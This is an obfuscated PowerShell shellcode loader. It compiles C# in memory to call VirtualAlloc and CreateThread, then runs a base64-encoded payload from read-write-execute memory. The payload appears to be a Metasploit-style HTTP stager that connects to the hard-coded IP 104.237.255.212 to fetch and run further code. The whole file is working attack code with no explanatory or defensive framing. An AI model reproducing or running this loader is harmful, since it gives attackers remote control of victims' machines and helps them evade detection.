Set-StrictMode -Version 2
$kvCgM = @"
        using System;
        using System.Runtime.InteropServices;
        namespace oi {
                public class func {
                        [Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
                        [Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }
                        [Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
                        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
                        [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
                        [DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
                }
        }
"@

$x_1H = New-Object Microsoft.CSharp.CSharpCodeProvider
$mugz3 = New-Object System.CodeDom.Compiler.CompilerParameters
$mugz3.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$mugz3.GenerateInMemory = $True
$w2t = $x_1H.CompileAssemblyFromSource($mugz3, $kvCgM)

[Byte[]]$aMdK8 = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6BAAAAAxMDQuMjM3LjI1NS4yMTIAWkiJwUnHwLsBAABNMclTU2oDU0m6V4mfxgAAAAD/1ejOAAAAL0JUZWVSbURYeXBoNG9YbWpJMEd6QndMZ1NEM004dUNkbE92c2s1Sk5oaHlndkplREpyT1RvbUM0LW9hdkVIc3JTRWdBUEtvRnJ6SmtrYTlLbk94Z3pLbktjS3BTTF9IaWZ5aWk5M1NKODF0bTBxYndkcTdvVDBCMC04cmlkby1OR0lWcGJfU1FCak9vUlRteDlXN1ZNZU5mSkxGbkpvc2k5NF9kQVlkZzZMZll0ZDlpN3VJOGJRZmVGVEd4M3ljU1lwYkdrV0hVeTZGbgBIicFTWkFYTTHJU0i4ADKghAAAAABQU1NJx8LrVS47/9VIicZqCl9IifFqH1pSaIAzAABJieBqBEFZSbp1Rp6GAAAAAP/VTTHAU1pIifFNMclNMclTU0nHwi0GGHv/1YXAdR9Ix8GIEwAASbpE8DXgAAAAAP/VSP/PdALrquhVAAAAU1lqQFpJidHB4hBJx8AAEAAASbpYpFPlAAAAAP/VSJNTU0iJ50iJ8UiJ2knHwAAgAABJiflJuhKWieIAAAAA/9VIg8QghcB0smaLB0gBw4XAddJYw1hqAFlJx8LwtaJW/9U=")

$fU = [oi.func]::VirtualAlloc(0, $aMdK8.Length + 1, [oi.func+AllocationType]::Reserve -bOr [oi.func+AllocationType]::Commit, [oi.func+MemoryProtection]::ExecuteReadWrite)
if ([Bool]!$fU) { $global:result = 3; return }
[System.Runtime.InteropServices.Marshal]::Copy($aMdK8, 0, $fU, $aMdK8.Length)
[IntPtr] $zqu = [oi.func]::CreateThread(0,0,$fU,0,0,0)
if ([Bool]!$zqu) { $global:result = 7; return }
$ro2 = [oi.func]::WaitForSingleObject($zqu, [oi.func+Time]::Infinite)
